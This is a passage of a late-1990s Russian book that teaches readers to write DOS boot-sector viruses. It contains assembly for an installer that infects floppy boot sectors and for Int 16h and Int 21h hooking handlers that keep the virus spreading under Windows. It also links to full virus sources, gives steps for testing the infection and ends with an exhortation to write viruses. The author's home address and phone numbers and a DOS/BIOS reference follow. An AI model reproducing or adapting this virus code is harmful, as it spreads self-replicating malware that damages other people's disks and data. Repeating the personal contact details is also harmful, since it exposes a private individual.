               int 13h                ;
               jc error               ;
                                      ;Сформируем код,
                                      ;который нужно
                                      ;записать на
                                      ;дискету вместо
                                      ;исходной BOOT -
                                      ;записи
               mov additor,055h       ;
               lea si,bufer + 55h     ;
               lea di,my_prg          ;
               mov cx,prg_lenght      ;
    copy_boot: mov al,byte ptr [di]   ;
               mov byte ptr [si],al   ;
               inc si                 ;
               inc di                 ;
               loop copy_boot         ;
    mov word ptr bufer[0],053ebh      ;
                                      ;И запишем его
                                      ;в первый
                                      ;сектор нулевой
                                      ;дорожки нулевой
                                      ;стороны дискеты
               mov ax,0301h           ;
               mov cx,01h             ;
               mov dx,0               ;
               lea bx,bufer           ;
               int 13h                ;
               jnc prg_end            ;
                                      ;
    error:     mov ah,09h             ;Если была оши-
               lea dx,err_mes         ;бка - выведем
               int 21h                ;сообщение о ней
                                      ;
    prg_end:   mov ax,4c00h           ;Завершаем за-
               int 21h                ;пускающую про-
                                      ;грамму
    err_mes    db   'Error !$'        ;Сообщение
    bufer      db   512 dup ( 0 )     ;В этот буфер
                                      ;считывается
                                      ;BOOT - сектор
                                      ;заражаемой
                                      ;дискеты
    prg ends                          ;
    end my_prg                        ;
</pre>
<p>Если вирусу не удалось заразить диск, то выдается сообщение "ERROR!". В этом случае попытку заражения просто нужно повторить.</p>
<p>И еще - если вы хотите узнать, зачем понадобились первые четыре команды инсталлятора, вам следует посмотреть приводимый ниже полный текст вирусной программы. Обратите внимание на первую команду, а именно : " jmp installer ".Инсталлятор замещает ее кодом, устанавливающим собственный стек вируса, и поэтому в заражаемые сектора эта команда не попадет.</p>
<h4><a name="p31f">1.15 Текст загрузочного вируса</a></h4>
<p>Ниже представлен текст предлагаемого загрузочного вируса:</p>
<p><a href="files/vik00_ru/boot.asm">Скачать boot.asm (18Kb)</a></p>
<h4><a name="p31g">1.16 Комментарии</a></h4>
<p>Вирус, который мы разработали в этой главе, заражает BOOT - сектора дискет и MBR жесткого диска. Как вы убедились, написать загрузочный вирус совсем несложно - гораздо легче,чем, скажем, файловый. Тем не менее я настоятельно рекомендую читателям попробовать "поймать" один из существующих загрузочных вирусов и исследовать его работу. Для начинающих можно порекомендовать FORM или KONSTANTIN.</p>
<p>Если же вы достаточно опытный вирусолог, то можете помериться силами с ONEHALF или другим шифрованным вирусом. Правда учтите, что экспериментировать с чужими вирусными программами надо осторожно - некоторые из них при трассировке вирусного кода могут испортить "винчестер" вашего компьютера.</p>
<h4><a name="p31h">1.17 Испытание вируса</a></h4>
<p>Для проверки в действии загрузочного вируса достаточно загрузиться с зараженного магнитного диска. Понаблюдайте, как вирус заражает дискеты и в каких случаях. Попробуйте найти в памяти вирусный код, а найдя - пройдите его отладчиком.</p>
<p>Перед проведением экспериментов с предложенной программой обязательно скопируйте оригинальную MBR жесткого диска в отдельный файл на дискете. Если этого не сделать, вы рискуете потерять данные на винчестере.</p>
<p>Все проверки вирусной программы рекомендуется проводить с помощью программы DISKEDIT, желательно одной из последних версий. С помощью этой же программы можно " вылечить " зараженный диск, если вирус вам "надоест".</p>
<h3><a name="p32">Глава 2. Еще один BOOT-вирус</a></h3>
<h4><a name="p321">2.1 Краткие итоги предыдущей главы</a></h4>
<p>Итак, продолжим. Наша цель - написать загрузочный вирус,который смог бы заражать дискеты даже из под WINDOWS. Хотя сделать это очень непросто.</p>
<p>Если вы испытывали вирус из предыдущей главы на своем компьютере ( не бойтесь, ничего не испортится), то могли обнаружить интересный эффект. Пусть при загрузке машины сначала загружается VC.COM или NC.EXE, а в WINDOWS вы переходите,нажав " F10 " и выйдя из оболочки. Очень часто так это и бывает - перечисленные оболочки настолько удачны, что отказаться от них почти невозможно, даже в пользу очень неплохого FARа. Так вот,при работе в оболочке вирус отлично заражает дискеты. Теперь нажмите "F10" и перейдите в WINDOWS. А теперь из - под WINDOWS снова запустите VC. Как это ни странно, наш вирус перестал работать. Он не заражает дискеты, а просто сидит в памяти. Снова вызвать его к жизни можно, лишь перезагрузив компьютер. Даже обидно. Но настоящие " вирусмейкеры " так просто не сдаются. Поэтому, утопив эту небольшую неудачу в большом количестве водки, примемся за дело.</p>
<h4><a name="p322">2.2 Объясняем полученные результаты</a></h4>
<p>С целью найти причины описанного явления я провел не один десяток экспериментов, и наконец, получил некоторые результаты.Как вы помните, наш вирус сидит на Int 13h. Таким образом, он получит управление только при вызове этого прерывания. Оказалось, что при записи или чтении дискет при работе в WINDOWS Int 13h вообще не вызывается. Вместо этого операционная система обращается к диску "мимо" прерывания, взаимодействуя непосредственно с контроллером гибких дисков.Поэтому наш вирус и не заражает дискеты.</p>
<p>Следует заметить, что при работе с жестким диском WINDOWS все же вызывает Int 13h, что следует из проведенных автором экспериментов.</p>
<p>Таким образом, с помощью старых методов эту задачу решить, скорее всего, не удастся. Необходим совершенно новый подход. Но об этом - в следующем пункте.</p>
<h4><a name="p323">2.3 Разрабатываем новый алгоритм активизации</a></h4>
<p>Легче всего сказать, что подход должен быть новым. Труднее предложить что - то по существу. Были придуманы несколько методик, но все они не дали положительного результата. И тут автор неожиданно получил очень своеобразное предложение - вместо Int 13h использовать для активизации вируса Int 21h. В самом деле, почему бы нам не перехватить Int 21h, и не попробовать проследить за сменой текущего диска (функция 0Eh). И как только активным станет дисковод "A" или "B", заразить диск в этом дисководе!!! Просто и со вкусом (идея Danny Dio, за что ему - благодарность). А мы продолжаем.</p>
<h4><a name="p324">2.4 О перехвате Int 21h программой, загружаемой из Master Boot Record</a></h4>
<p>Дело за малым - осталось перехватить Int 21h, и задача решена. Но выяснилось, что это не так просто. Естественно было бы поступить так:</p>
<ol>
<li>Первым делом установить вектор Int 1Ch или Int 08h ( оба - таймер ) на собственный обработчик.</li>
<li>Этот обработчик следит за вектором Int 21h, и как только последний изменяется - перехватывает Int 21h.</li>
<li>Далее обработчик Int 1Ch (Int 08h) "обезвреживает" себя в памяти, например, командой "IRET", чтобы машина не зависала.</li>
</ol>
<p>Так и было сделано, после чего началось самое интересное. Обработчик Int 21h исправно выполнялся несколько секунд, после чего его бессовестно топили - то ли MSDOS.SYS, то ли COMMAND.COM - не важно. Чтобы избавиться от этого эффекта, я придумал кучу способов - например, ждал не первого изменения вектора Int 21h, а, например, третьего, десятого и т.п. Как ни странно, ничего не получалось. Единственным методом был бы такой:</p>
<ol>
<li>Отловить момент, когда OC уже загружена и начинают выполняться программы, записанные, например, в AUTOEXEC.BAT.</li>
<li>Перехватить Int 21h.</li>
</ol>
<p>Проблема здесь в следующем: совершенно неясно, как именно засечь этот замечательный момент. Кроме того,такой метод тоже не дает стопроцентной гарантии. Поэтому идею пришлось отклонить, а вместо нее предложить алгоритм, который обсуждается в следующем пункте.</p>
<h4><a name="p325">2.5 О применении вектора Int 16h</a></h4>
<p>Как вы, наверное, знаете, прерывание Int 16h является программным и вызывается, например, системным обработчиком Int 09h (клавиатура), а также может вызываться из программы для выполнения некоторых действий,например, чтения символа с клавиатуры, получения ее флагов и т.п. При этом оно обладает одним замечательным свойством, а именно - пользовательский обработчик Int 16h не утапливается WINDOWS при загрузке, и вызывается даже в WORDе, EXCELе и FARе. Так, в проведенном автором эксперименте, при нажатии двух SHIFTов загрузочный сектор дискеты считывался и тут же записывался на место. Опытная программа загружалась из MBR и работала в любых WINDOWS - приложениях. Этот факт решено было использовать для построения "непотопляемой" процедуры обработки Int 21h. Итак, предлагаю такой алгоритм:</p>
<ol>
<li>Установить вектор Int 16h на вирусный обработчик.</li>
<li>Этот обработчик постоянно вызывает вирусную процедуру Int 21h какой - нибудь экзотической собственной функцией, типа AX = 0BABCh.</li>
<li>Если вирусная процедура обработки Int 21h активна, она должна " ответить " на этот вызов (пусть это будет AL = 98h). Если ответа нет, обработчик Int 21h не установлен или утоплен, поэтому Int 21h следует перехватить.</li>
</ol>
<p>Не совсем просто, но тоже со вкусом. Сами процедуры обработки Int 16h и Int 21h могут быть, например, такими:</p>
<p>Текст обработчика Int 16h:</p>
<pre class="source">
    new_16h:   push ax                ;Сохраним
               push bx                ;регистры
               push dx                ;в
               push ds                ;стеке
               push es                ;
               pushf                  ;
                                      ;
               mov ax,0babch          ;Вызовем вирусный
               int 21h                ;обработчик
               cmp al,98h             ;Int 21h собст-
               je cs:rrr_rrr          ;венной функцией
                                      ;AX = 0babch.Если
                                      ;обработчик акти-
                                      ;вен, мы должны
                                      ;получить AL=98h,
                                      ;иначе Int 21h
                                      ;следует перехва-
                                      ;тить, чем мы и
                                      ;займемся:
               push cs                ;DS = CS
               pop ds                 ;
                                      ;
               cli                    ;Запретить преры-
                                      ;вания
               mov ax,3521h           ;Получим и сохра-
               int 21h                ;ним вектор
               mov old_21h - 100h,bx  ;Int 21h
               mov old_21h_2 - 100h,es;
                                      ;
               mov ax,2521h           ;А теперь пере-
               mov dx,to_new_21h      ;ставим этот век-
               int 21h                ;тор на вирусный
                                      ;обработчик
               sti                    ;Разрешить преры-
                                      ;вания
    rrr_rrr:   popf                   ;Восстановим
               pop es                 ;из
               pop ds                 ;стека
               pop dx                 ;регистры
               pop bx                 ;
               pop ax                 ;
                                      ;
               db 0eah                ;И перейдем на
    old_16h    dw 0                   ;системный обра-
    old_16h_2  dw 0                   ;ботчик Int 16h
</pre>
<p>Текст обработчика Int 21h (он отслеживает смену оператором текущего диска. Если текущим становится диск "A" или "B", обработчик заражает этот диск):</p>
<pre class="source">
    new_21h:   pushf                  ;Этот участок
               cmp ax,0babch          ;обработчика
               jne cs:else_func       ;Int 21h отвечает
               mov al,98h             ;обработчику
               popf                   ;Int 16h значени-
               iret                   ;ем AL = 98h; это
                                      ;служит признаком
                                      ;активности виру-
                                      ;сной процедуры
                                      ;обработки
                                      ;Int 21h
                                      ;
    else_func: popf                   ;Сохраним
               push ax                ;регистры
               push bx                ;в
               push cx                ;стеке
               push dx                ;
               push di                ;
               push ds                ;
               push es                ;
               pushf                  ;
                                      ;
               cmp ah,0eh             ;Смена текущего
                                      ;диска ?
               jne cs:restore_regs    ;Нет - на выход
               cmp dl,1               ;Да - текущим
                                      ;хотят сделать
                                      ;" A " или " B "
                                      ;дисковод ?
               ja cs:restore_regs     ;Нет - на выход
                                      ;Иначе - продол-
                                      ;жим :
    ;Далее следует " заразная " часть процедуры  обра-
    ;ботки Int 21h :

    ;   ...
    ;   ...
    ;   ...
    ;   ...
    ;   ...

    restore_regs:                     ;Восстановим из
               popf                   ;стека регистры
               pop es                 ;
               pop ds                 ;
               pop di                 ;
               pop dx                 ;
               pop cx                 ;
               pop bx                 ;
               pop ax                 ;
                                      ;
               db 0eah                ;И перейдем на
    old_21h    dw 0                   ;системный обра-
    old_21h_2  dw 0                   ;ботчик Int 21h
</pre>
<p>Вроде бы, все должно быть ясно. Причина, по которой от относительных адресов ячеек памяти отнимается 100h, описана в части 1, главе 2, пункте 2.5.</p>
<p>Кстати, использовать в данном случае Int 09h вместо Int 16h нельзя. Дело в том, что при загрузке WINDOWS топит все пользовательские программы, которые "зацеплены" за этот вектор. Топится даже великий и могучий KEYRUS.COM,не говоря уже о наших вирусах.</p>
<h4><a name="p326">2.6 Общий алгоритм работы вируса</a></h4>
<p>Теперь настало время создать алгоритм работы нашего вируса, чем мы и займемся. Как и прежде, попав при начальной загрузке машины в память по адресу 0000:7C00h, вирус должен выполнить такие действия:</p>
<ol>
<li>Установить регистры SS и SP на собственный стек</li>
<li>"Отрезать" у системы несколько килобайтов памяти (вы уже догадываетесь, что "несколько" - это два?).</li>
<li>Переписать свой код в полученную область памяти</li>
<li>Передать управление следующей секции своего кода, уже расположенной в конце основной памяти.</li>
</ol>
<p>Эта секция, в свою очередь, должна:</p>
<ol>
<li>Переопределить вектор прерывания Int 16h на вирусный код.</li>
<li>Считать настоящий загрузочный сектор в память по адресу 0000:7C00h.</li>
<li>Проверить, заражен - ли винчестер. Если нет, то заразить его MBR.</li>
<li>Передать управление настоящему загрузочному сектору, находящемуся по адресу 0000:7C00h.</li>
</ol>
<p>Далее выполняется загрузка операционной системы. Вирусный обработчик Int 16h,как было сказано выше, следит за состоянием обработчика Int 21h, и перехватывает это прерывание,если по какой - либо причине вирусная процедура обработки Int 21h не активна. Алгоритм его работы подробно описан в предыдущем пункте.</p>
<p>Как вы уже знаете," заразные " функции мы возложим на обработчик прерывания Int 21h. О том, как это будет реализовано, тоже было рассказано выше.</p>
<h4><a name="p327">2.7 Полный текст созданного вируса</a></h4>
<p>Как ни жалко, но остается только одно - "слепить" все части нашей заразной разработки в одно целое и привести полученный результат:</p>
<p><a href="files/vik00_ru/boot2.asm">Скачать boot2.asm (20Kb)</a></p>
<p>Как видите, вирус является некоторой "помесью" программы из предыдущей главы с принципиально новыми фрагментами из главы, которую вы сейчас читаете. Поэтому я не считаю нужным заново объяснять идеи, заложенные в предыдущую версию программы. Желающие получить такие объяснения могут вернуться к предыдущей главе. Заметьте, нам опять повезло - вирус целиком поместился в один сектор, осталось даже 9 свободных байт.</p>
<h4><a name="p328">2.8 Испытание вируса</a></h4>
<p>С методикой испытания загрузочного вируса вы уже знакомы. Поэтому можно сразу переходить к самому приятному этапу в творчестве любого создателя вирусов. Модель примерно такая: из - под WINDOWS запустите VC, NC, Turbo Pascal или что - нибудь похожее. После чего попробуйте несколько раз установить текущим один из дисководов. Понаблюдайте, как вирус заражает дискеты и при каких условиях. Заражение должно происходить обязательно. Наша предыдущая программа такими возможностями явно не обладала.</p>
<p>Теперь выйдите из оболочки обратно в WINDOWS и запустите, например, FAR. Вы увидите, что в FARе наш вирус не активизируется. Не активизируется он и в WORDе и EXCELе. Объясняется это просто: Эти программы являются 32-х разрядными WINDOWS - приложениями, и поэтому не могут вызывать DOSовские прерывания! Вместо этого для смены диска, например, вызывается SetCurrentDisk. Об этом мне поведал Eugene Roshal, разработчик FARа. Хотя то, чего мы добились - уже большой шаг вперед по сравнению с прошлой разработкой.</p>
<h4><a name="p329">2.9 Вместо комментария</a></h4>
<p>Наверное, следовало бы наметить пути совершенствования нашей разработки. Первое, что приходит на ум - тем или иным способом перехватить тот момент, когда система вызывает SetCurrentDisk, если это вообще возможно. Как это сделать - пока неясно, так что вопрос остается открытым.</p>
<p>Определенные надежды вселяет описанная выше возможность использовать для активизации вируса прерывание Int 16h. В самом деле, почему бы не заражать диски, например, при каждом десятом нажатии на клавишу " ALT ", " SHIFT " и т.п.? Правда, этот метод имеет и свои недостатки, которые делают его похожим на обычное ламерство. Зато его очень просто реализовать, и работать он будет в любом WINDOWS - приложении...</p>
<p>Единственное, чего делать точно не следует - это огорчаться по поводу не совсем достигнутой цели. Думаю, это дело недалекого будущего. Как сказал Мао Цзедун, "Наш путь труден, но перспективы - светлые!".</p>
<h2><a name="pe">Заключение</a></h2>
<p>Эта книга задумывалась и писалась лишь для того, чтобы приоткрыть завесу таинственности и секретности, которой окутана почти не овещаемая в литературе тема компьютерных вирусов. Автор ни в коем случае не ставил своей целью обучить пользователей ЭВМ разработке всевозможных "вредных" программных средств, а просто хотел поделиться своими знаниями и результатами экспериментов с широкой общественностью. Наверняка найдется немало людей - специалистов и любителей, которых интересует затронутая в данной работе тема. И если кто - то из них пожелает ознакомиться с предлагаемой книгой, я буду считать, что потратил время не зря. Разработка действующих компьютерных вирусов - захватывающее и сложное дело, требующее немалого опыта и определенной теоретической базы. Надеюсь, эта книга сможет оказать вам некоторую помощь.</p>
<p>К сожалению, изложение не рассчитано на начинающих, поэтому автору не удалось приблизить стиль книги к научно - популярному. Хотя это трудно отнести к недостаткам.</p>
<p>До встречи!</p>
<pre>
			г. Житомир, 18.08.1998
			И. Коваль
</pre>
<p>По возникшим вопросам вы можете обратиться к автору этой книги .С благодарностью приму любые замечания, пожелания и предложения.</p>
<p>ПИШИТЕ ВИРУСЫ, КАК ЗАВЕЩАЛ ВЕЛИКИЙ ЛЕНИН, КАК УЧИТ НАС КОММУНИСТИЧЕСКАЯ ПАРТИЯ !!!</p>
<pre>
			Украина
			г. Житомир
			ул. Большая Бердичевская, д. 83, кв. 25
			Коваль Игорь Михайлович
			тел. 8 (0412) 343427
			     8 (0412) 204218
			Индекс : 262002
</pre>
<h2><a name="pl">Литература</a></h2>
<ol>
<li>Финогенов К. Г. "Самоучитель по системным функциям MS DOS ", М.:Малип, 1993</li>
<li>П. Абель "Язык ассемблера для IBM PC и программирования ", М.:Высшая школа, 1991</li>
<li>Хижняк П. Л. "Пишем вирус... и антивирус!", М.:Инфо, 1991</li>
<li>Касаткин А. И. "Профессиональное программирование на языке СИ. Управление ресурсами ", Минск, Вышейшая школа, 1992</li>
<li>Самофалов К. Г., Викторов О. В. "Микропроцессоры",М.:Библиотека инженера, 1990</li>
</ol>
<h2><a name="pa1">Приложение 1. Краткий справочник по функциям MS DOS и BIOS</a></h2>
<p><em>Справочные материалы по функциям MS DOS и BIOS с незначительными изменениями заимствованы из [1], за что автор приносит К. Г. Финогенову свои извинения.</em></p>
<h3>Функция 09h</h3>
<p>Вывод строки на экран. Последним символом строки должен быть "$" .Управляющие коды: 07h - звонок, 08h - шаг назад, 0Ah - перевод строки, 0Dh - возврат каретки.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 09h</p>
<p>DS : DX = адрес строки.</p>
<h3>Функция 0Eh</h3>
<p>Выбор диска. Предназначена для смены текущего диска. Также возвращает количество логических дисков.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 0Eh</p>
<p>AL = код дисковода ( 0 = A, 1 = B, 80h = C и т.п.)</p>
<p><strong>Возврат:</strong></p>
<p>AL = количество дисководов в системе.</p>
<h3>Функция 19h</h3>
<p>Получение текущего диска.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 19h</p>
<p><strong>Возврат:</strong></p>
<p>AL = код текущего диска ( 0 = A, 1 = B, 80h = C и т.п.).</p>
<h3>Функция 1Ah</h3>
<p>Установка адреса области передачи данных (DTA). Устанавливает заданный адрес DTA.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 1Ah</p>
<p>DS : DX = адрес DTA.</p>
<h3>Функция 25h</h3>
<p>Установка вектора прерывания. Записывает адрес программы обработки заданного прерывания в таблицу векторов.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 25h</p>
<p>AL = номер вектора прерывания</p>
<p>DS : DX = адрес программы обработки прерывания.</p>
<h3>Функция 19h</h3>
<p>Получение даты.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 2Ah</p>
<p><strong>Возврат:</strong></p>
<p>CX = год</p>
<p>DH = месяц</p>
<p>DL = день</p>
<p>AL = день недели ( 0 = воскресенье, 6 - суббота).</p>
<h3>Функция 2Fh</h3>
<p>Получение адреса области передачи данных (DTA). Возвращает текущий адрес DTA.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 2Fh</p>
<p><strong>Возврат:</strong></p>
<p>ES : DX = адрес DTA.</p>
<h3>Функция 35h</h3>
<p>Получение вектора прерывания. Считывает адрес программы обработки заданного прерывания из таблицы векторов.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 35h</p>
<p>AL = номер вектора прерывания</p>
<p><strong>Возврат:</strong></p>
<p>ES : BX = адрес программы обработки прерывания.</p>
<h3>Функция 3Bh</h3>
<p>Смена каталога.Предназначена для выбора текущего каталога.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 3Bh</p>
<p>DS : DX = полное имя каталога (например, C:\TASM\VIRUS\</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 3Dh</h3>
<p>Открытие файла. Открывает файл с заданным именем и возвращает дескриптор, выделенный этому файлу системой. Указатель устанавливается на начало файла.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 3Dh</p>
<p>AL = режим доступа: 0 - для чтения, 1 - для записи, 2 - для чтения и записи</p>
<p>DS : DX = полное имя файла ( например, C:\TASM\VIRUS\EXE_VIR.COM )</p>
<p><strong>Возврат:</strong></p>
<p>AX = дескриптор</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 3Eh</h3>
<p>Закрытие файла. Закрывает файл с заданным дескриптором.Дескриптор освобождается, кроме того, модифицируются дата и время создания файла, если файл был изменен.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 3Eh</p>
<p>DX = дескриптор</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 3Fh</h3>
<p>Чтение из файла или устройства. Считывает данные из файла или устройства и модифицирует указатель. При чтении читается строка указанной длины. При чтении из символьного устройства чтение прекращается, если встретился символ возврата каретки ( например,при вводе с клавиатуры ).</p>
<p><strong>Вызов:</strong></p>
<p>AH = 3Fh</p>
<p>BX = дескриптор</p>
<p>CX = количество передаваемых символов</p>
<p>DS : DX = адрес буфера, в который помещаются данные</p>
<p><strong>Возврат:</strong></p>
<p>AX = число переданных байт</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 40h</h3>
<p>Запись в файл или в устройство. Считывает данные из буфера и записывает их в файл, при этом модифицируется указатель. При записи записывается строка указанной длины.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 40h</p>
<p>BX = дескриптор</p>
<p>CX = количество передаваемых символов</p>
<p>DS : DX = адрес буфера, в который помещаются данные</p>
<p><strong>Возврат:</strong></p>
<p>AX = число переданных байт</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 42h</h3>
<p>Установка указателя в файле. Предназначена для установки указателя на требуемый байт в файле.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 42h</p>
<p>BX = дескриптор</p>
<p>AL = режим установки указателя:</p>
<ul>
<li>0 - смещение от начала файла</li>
<li>1 - смещение от текущего положения указателя</li>
<li>2 - смещение от конца файла</li>
</ul>
<p>CX = старшая часть смещения</p>
<p>DX = младшая часть смещения</p>
<p><strong>Возврат:</strong></p>
<p>CX = старшая часть возвращенного указателя</p>
<p>DX = младшая часть возвращенного указателя.</p>
<h3>Функция 48h</h3>
<p>Выделение блока памяти указанного размера. Выделяет блок памяти, после чего возвращает его сегментный адрес.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 48h</p>
<p>BX = Размер блока памяти в параграфах</p>
<p><strong>Возврат:</strong></p>
<p>AX = сегментный адрес выделенного системой блока</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<p>BX = размер наибольшего доступного в данный момент блока.</p>
<h3>Функция 49h</h3>
<p>Освобождение блока памяти.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 49h</p>
<p>ES = сегментный адрес блока,который следует освободить</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 4Ah</h3>
<p>Изменение размера блока памяти, который был выделен программе.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 4Ah</p>
<p>BX = новый размер блока в параграфах.</p>
<p>ES = сегментный адрес блока, размер которого следует изменить</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<p>BX = размер наибольшего доступного в данный момент блока.</p>
<h3>Функция 4Ch</h3>
<p>Завершение процесса с кодом возврата. Завершает текущую задачу и передает код завершения родительскому процессу. Освобождает выделенную программе память, сбрасывает на диск буферы, закрывает дескрипторы, восстанавливает из PSP вектора прерываний INT 22h, INT 23h и INT 24h. Далее управление передается родительскому процессу.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 4Ch</p>
<p>AL = код возврата.</p>
<p>AL = 00h обычно соответствует нормальному завершению программы.</p>
<h3>Функция 4Eh</h3>
<p>Поиск первого файла. Производит поиск в заданном каталоге первого файла, соответствующего заданной маске и имеющего указанные атрибуты.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 4Eh</p>
<p>CX = атрибуты файла (могут комбинироваться):</p>
<ul>
<li>1 - только читаемый (read only)</li>
<li>2 - скрытый (hidden)</li>
<li>4 - системный (system)</li>
<li>8 - метка тома</li>
<li>20h - архивный (archive)</li>
</ul>
<p>DS : DX = адрес маски для поиска</p>
<p><strong>Возврат:</strong></p>
<p>имя найденного файла и его расширение записывается в DTA в байты 1Eh - 2Ah. За последним символом расширения всегда следует точка: "."</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Функция 4Fh</h3>
<p>Поиск следующего файла. Почти всегда используется в паре с предыдущей функцией и вызывается после того, как был найден первый файл.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 4Fh</p>
<p><strong>Возврат:</strong></p>
<p>имя найденного файла и его расширение записывается в DTA в байты 1Eh - 2Ah. За последним символом расширения всегда следует точка: "."</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Мультиплексное прерывание INT 2Fh.</h3>
<p>Используется для организации взаимодействия резидентных программ с системой и друг с другом. Для программиста зарезервированы функции: C0h - FFh.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 2Fh</p>
<p>AL = подфункция</p>
<p><strong>Возврат:</strong></p>
<p>AL = 0 - программа не установлена и ее можно установить</p>
<p>AL = 1 - программа не установлена и ее нельзя установить</p>
<p>AL = 0FFh - программа уже установлена.</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AX = код ошибки.</p>
<h3>Прерывание INT 13h, функция 02h - чтение сектора.</h3>
<p>Считывает один или несколько определенных пользователем секторов физического диска в выделенный буфер. Для начального сектора указываются такие координаты: дорожка,сектор, головка. Секторы на дорожке нумеруются от единицы, дорожки и головки нумеруются от нуля.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 02h</p>
<p>AL = количество читаемых секторов</p>
<p>CH = дорожка</p>
<p>CL = начальный сектор</p>
<p>DH = головка</p>
<p>DL = дисковод ( 00h - 07Fh - для дискетного дисковода, 80h - 0FFh - для "винчестера".</p>
<p>ES : BX = адрес буфера, в который будет читаться информация из секторов</p>
<p><strong>Возврат:</strong></p>
<p>CF = 0</p>
<p>AH = 0</p>
<p>AL = количество прочитанных секторов</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AH = байт состояния.</p>
<p>(*) Биты регистра CX 5...0 определяют номер сектора, а биты 15...6 - номер дорожки !!! Это выглядит так:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="номер сектора/дорожки">
<tr><th>Номер бита </th><td>15 </td><td>14 </td><td>13 </td><td>12 </td><td>11 </td><td>10 </td><td>9 </td><td>8</td></tr>
<tr><th>Содержимое бита </th><td>c </td><td>c </td><td>c </td><td>c </td><td>c </td><td>c </td><td>c </td><td>c</td></tr>
<tr><th>Номер бита </th><td>7 </td><td>6 </td><td>5 </td><td>4 </td><td>3 </td><td>2 </td><td>1 </td><td>0</td></tr>
<tr><th>Содержимое бита </th><td>C </td><td>c </td><td>S </td><td>s </td><td>s </td><td>s </td><td>s </td><td>s</td></tr>
</table>
<p>Буква "C" или "c" означает, что бит принадлежит номеру дорожки; Буква "S" или "s" означает, что бит принадлежит номеру сектора.</p>
<p>Таким образом, биты "7" и "6" являются старшими битами номера дорожки, а биты "5" и "4" являются старшими битами номера сектора.</p>
<h3>Прерывание INT 13h, функция 03h - запись сектора.</h3>
<p>Записывает один или несколько определенных пользователем секторов на физический диск. Для начального сектора указываются такие координаты: дорожка, сектор, головка. Секторы на дорожке нумеруются от единицы, дорожки и головки нумеруются от нуля.</p>
<p><strong>Вызов:</strong></p>
<p>AH = 03h</p>
<p>AL = количество записываемых секторов</p>
<p>CH = дорожка</p>
<p>CL = начальный сектор</p>
<p>DH = головка</p>
<p>DL = дисковод ( 00h - 07Fh - для дискетного дисковода, 80h-0FFh - для "винчестера".</p>
<p>ES : BX = адрес буфера, информация из которого будет записываться в сектора</p>
<p><strong>Возврат:</strong></p>
<p>CF = 0</p>
<p>AH = 0</p>
<p>AL = количество записанных секторов</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AH = байт состояния.</p>
<p>(*) Биты регистра CX 5...0 определяют номер сектора, а биты 15...6 - номер дорожки !!! (см. функцию 02h).</p>
<h3>Прерывание INT 13h, функция 08h - получение параметров дисковода.</h3>
<p><strong>Вызов:</strong></p>
<p>AH = 08h</p>
<p>DL = дисковод (00h-07Fh - для дискетного дисковода, 80h-0FFh - для "винчестера".</p>
<p><strong>Возврат:</strong></p>
<p>AH = 0</p>
<p>BL = тип дисковода ( только AT и PS2 )</p>
<p>DL = количество накопителей, обслуживаемых первым контроллером</p>
<p>DH = максимальный номер головки</p>
<p>CL = максимальный номер сектора</p>
<p>CH = максимальный номер дорожки (см. функцию 02h)</p>
<p>ES:DI = адрес таблицы параметров дисковода</p>
<p><strong>При ошибке:</strong></p>
<p>CF = 1</p>
<p>AH = байт состояния.</p>
<p>(*) Функция не работает на IBM XT для дисководов !!!</p>
<h2><a name="pa2">Приложение 2. Формат загрузочной записи для MS DOS различных версий</a></h2>
<h3>Формат BOOT - записи для версий MS DOS до 4.0</h3>
<table border="1" cellspacing="0" cellpadding="0" summary="Формат BOOT - записи для версий MS DOS до 4.0">
<tr><th>Смещение (HEX)</th><th>Размер (DEC)</th><th>Содержимое</th></tr>
<tr><td> 00h </td><td>03 </td><td>Команда EB xx 90 перехода на программу начальной загрузки</td></tr>
<tr><td> 03h </td><td>08 </td><td>Название фирмы - производителя и номер операционной системы</td></tr>
<tr><td> 0Bh </td><td>13 </td><td>Блок параметров BIOS ( BPB )</td></tr>
<tr><td> 18h </td><td>02 </td><td>Количество секторов на дорожке</td></tr>
<tr><td> 1Ah </td><td>02 </td><td>Количество поверхностей диска</td></tr>
<tr><td> 1Ch </td><td>02 </td><td>Количество скрытых секторов, которые иногда используются для разбиения диска на разделы</td></tr>
